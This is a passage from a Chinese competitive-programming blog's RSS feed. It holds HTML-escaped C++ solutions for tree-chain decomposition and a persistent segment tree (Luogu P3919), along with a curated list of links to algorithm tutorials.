class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;dfs2&lt;/span&gt;(r,r);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;build&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,n);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(m--) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; k,x,y,z;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;(k);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(k==&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;(x);&lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;(y);&lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;(z);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;updRange&lt;/span&gt;(x,y,z);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(k==&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;(x);&lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;(y);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d\n&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;qRange&lt;/span&gt;(x,y));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(k==&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;(x);&lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;(y);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;updSon&lt;/span&gt;(x,y);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;(x);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d\n&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;qSon&lt;/span&gt;(x));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2018/02/21/%E4%BF%A1%E6%81%AF%E5%AD%A6%E7%AB%9E%E8%B5%9B%E7%9B%B8%E5%85%B3%E4%BC%98%E7%A7%80%E6%96%87%E7%AB%A0%E5%90%88%E9%9B%86/</guid>
            <title>信息学竞赛相关优秀文章合集</title>
            <link>http://cubicy.icu/2018/02/21/%E4%BF%A1%E6%81%AF%E5%AD%A6%E7%AB%9E%E8%B5%9B%E7%9B%B8%E5%85%B3%E4%BC%98%E7%A7%80%E6%96%87%E7%AB%A0%E5%90%88%E9%9B%86/</link>
            <pubDate>Wed, 21 Feb 2018 23:36:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;&lt;a href=&#34;//blog.csdn.net/zearot/article/details/48299459&#34;&gt;线段树详解 （原理，实现与应用）&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;//blog.csdn.net/lyd_7_29/article/details/51405469&#34;&gt;可持久化线段树 简介&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;//files.cnblogs.com/files/yyy2015c01/%E8%BF%90%E7%94%A8%E4%BC%B8%E5%B1%95%E6%A0%91%E8%A7%A3%E5%86%B3%E6%95%B0%E5%88%97%E7%BB%B4%E6%8A%A4%E9%97%AE%E9%A2%98.pdf&#34;&gt;运用伸展树解决数列维护问题.pdf&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;//oi.men.ci/splay-notes-1/&#34;&gt;Splay 学习笔记（一）&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;//oi.men.ci/splay-notes-2/&#34;&gt;Splay 学习笔记（二）&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;//oi.men.ci/splay-notes-3/&#34;&gt;Splay 学习笔记（三）&lt;/a&gt;   &lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;//lib.csdn.net/article/datastructure/9204&#34;&gt;请要相信我，30分钟让你掌握AVL树（平衡二叉树）&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;//blog.csdn.net/sun_tttt/article/details/65445754&#34;&gt;最容易懂的红黑树&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;//www.cnblogs.com/Mathics/p/3971220.html&#34;&gt;三大平衡树（Treap + Splay + SBT）总结+模板&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;//oi.men.ci/link-cut-tree-notes/&#34;&gt;Link-Cut Tree 学习笔记&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;//files.cnblogs.com/files/yyy2015c01/%E5%8F%AF%E6%8C%81%E4%B9%85%E5%8C%96%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%A0%94%E7%A9%B6.pdf&#34;&gt;可持久化数据结构研究.pdf&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;//www.cnblogs.com/dalt/p/8206664.html&#34;&gt;树链剖分详解&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;//www.cnblogs.com/chinhhh/p/7965433.html&#34;&gt;树链剖分详解（洛谷模板 P3384）&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;//blog.csdn.net/PomeCat/article/details/72832494&#34;&gt;动态规划（DP）优化之斜率优化讲解&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;//www.cnblogs.com/MashiroSky/p/6009685.html&#34;&gt;斜率优化学习笔记&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;//www.cnblogs.com/mlystdcall/p/6525962.html&#34;&gt;四边形不等式学习笔记&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;//www.yhzq-blog.cc/%E6%8F%92%E5%A4%B4dp-%E4%BB%8E%E4%B8%8D%E4%BC%9A%E5%88%B0%E5%B4%A9%E6%BA%83/&#34;&gt;插头dp入门&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;//segmentfault.com/a/1190000003914228&#34;&gt;最长回文子串——Manacher 算法（人称“马拉车算法”）&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;//www.cnblogs.com/mlystdcall/p/6734852.html&#34;&gt;上下界网络流建模方法总结&lt;/a&gt;   &lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;//www.gatevin.moe/acm/fft%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&#34;&gt;FFT算法学习笔记&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;//www.cnblogs.com/tmzbot/p/4668158.html&#34;&gt;Fast Walsh-Hadamard Transform（快速沃尔什变换）&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;//www.cnblogs.com/mlystdcall/p/6219421.html&#34;&gt;简易CDQ分治教程&amp;amp;学习笔记&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;//www.cnblogs.com/mlystdcall/p/6232324.html&#34;&gt;四维偏序(CDQ套CDQ)&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2018/02/20/%E6%B4%9B%E8%B0%B7P3919%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E5%8F%AF%E6%8C%81%E4%B9%85%E5%8C%96%E6%95%B0%E7%BB%84/</guid>
            <title>洛谷:P3919 【模板】可持久化数组（可持久化线段树/平衡树）</title>
            <link>http://cubicy.icu/2018/02/20/%E6%B4%9B%E8%B0%B7P3919%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E5%8F%AF%E6%8C%81%E4%B9%85%E5%8C%96%E6%95%B0%E7%BB%84/</link>
            <category>持久化</category>
            <category>线段树</category>
            <pubDate>Tue, 20 Feb 2018 23:36:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;原题地址:&lt;a href=&#34;//www.luogu.org/problemnew/show/P3919&#34;&gt;https://www.luogu.org/problemnew/show/P3919&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;题目简述&#34;&gt;&lt;a href=&#34;#题目简述&#34; class=&#34;headerlink&#34; title=&#34;题目简述&#34;&gt;&lt;/a&gt;题目简述&lt;/h3&gt;&lt;p&gt;维护一个长度为N的数组，支持如下几种操作：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在某个历史版本上修改某一个位置上的值  &lt;/li&gt;
&lt;li&gt;访问某个历史版本上的某一位置的值&lt;br&gt;此外，每进行一次操作（对于操作2，即为生成一个完全一样的版本，不作任何改动），就会生成一个新的版本。版本编号即为当前操作的编号（从1开始编号，版本0表示初始状态数组）&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h3 id=&#34;思路&#34;&gt;&lt;a href=&#34;#思路&#34; class=&#34;headerlink&#34; title=&#34;思路&#34;&gt;&lt;/a&gt;思路&lt;/h3&gt;&lt;p&gt;首先感谢来自&lt;a href=&#34;https://www.luogu.org/space/show?uid=2978&#34;&gt;@zcysky&lt;/a&gt;的模板。写的非常漂亮，封装也很精致。&lt;br&gt;这题是裸题，于是直接上模板就行了。注意此题输入数据大，需要读入优化。&lt;br&gt;关于可持久化线段树的介绍与总结，之后把坑填上。  &lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;代码&#34;&gt;&lt;a href=&#34;#代码&#34; class=&#34;headerlink&#34; title=&#34;代码&#34;&gt;&lt;/a&gt;代码&lt;/h3&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;bits/stdc++.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; N=&lt;span class=&#34;number&#34;&gt;1000005&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt; std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a[N],n,q,rt[N*&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;];&lt;span class=&#34;comment&#34;&gt;//空间复杂度O(mlogn) &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; MAXB 50000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[MAXB],*cp=buf;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; f=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,x=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(*cp&amp;lt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;||*cp&amp;gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;9&amp;#x27;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(*cp==&lt;span class=&#34;string&#34;&gt;&amp;#x27;-&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            f=&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cp++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(*cp&amp;gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;&amp;amp;&amp;amp;*cp&amp;lt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;9&amp;#x27;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        x=x*&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;+*cp-&lt;span class=&#34;string&#34;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cp++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; f*x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Persistable_Segment_Tree&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; lc[N*&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;],rc[N*&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;],val[N*&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;],cnt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &amp;amp;o,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; l,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; r)&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        o=++cnt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(l==r) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            val[o]=a[l];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; mid=(l+r)&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;build&lt;/span&gt;(lc[o],l,mid);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;build&lt;/span&gt;(rc[o],mid+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,r);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;ins&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &amp;amp;o,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; pre,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; l,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; r,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; q,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v)&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        o=++cnt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        lc[o]=lc[pre];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        rc[o]=rc[pre];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        val[o]=val[pre];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(l==r) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            val[o]=v;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; mid=(l+r)&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(q&amp;lt;=mid)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;ins&lt;/span&gt;(lc[o],lc[pre],l,mid,q,v);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;ins&lt;/span&gt;(rc[o],rc[pre],mid+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,r,q,v);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; o,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; l,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; r,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; q)&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;span class=&#34;comment&#34;&gt;//类似二分的查询 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(l==r)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; val[o];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; mid=(l+r)&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(q&amp;lt;=mid)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;query&lt;/span&gt;(lc[o],l,mid,q);&lt;/span&gt;&lt;br&gt;&lt;span 